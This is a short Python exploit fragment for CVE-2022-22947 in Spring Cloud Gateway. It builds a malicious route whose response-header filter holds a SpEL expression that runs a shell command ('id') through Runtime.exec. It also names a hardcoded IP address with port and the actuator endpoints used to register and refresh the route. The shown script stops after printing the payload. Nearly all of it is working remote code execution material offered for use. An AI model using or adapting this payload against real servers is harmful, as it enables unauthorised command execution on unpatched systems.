# coding:utf-8
# CVE-2022-22947
import requests
q = "id"
headers = {
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": '#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'+'\\'+'\"'+q+'\\"}).getInputStream()))}'
    }
  }],
  "uri": "http://example.com"
}
print(headers)
ip = "http://47.95.201.15:8012/"
payload1 = "/actuator/gateway/routes/hacktest"
payload2 = "/actuator/gateway/refresh"
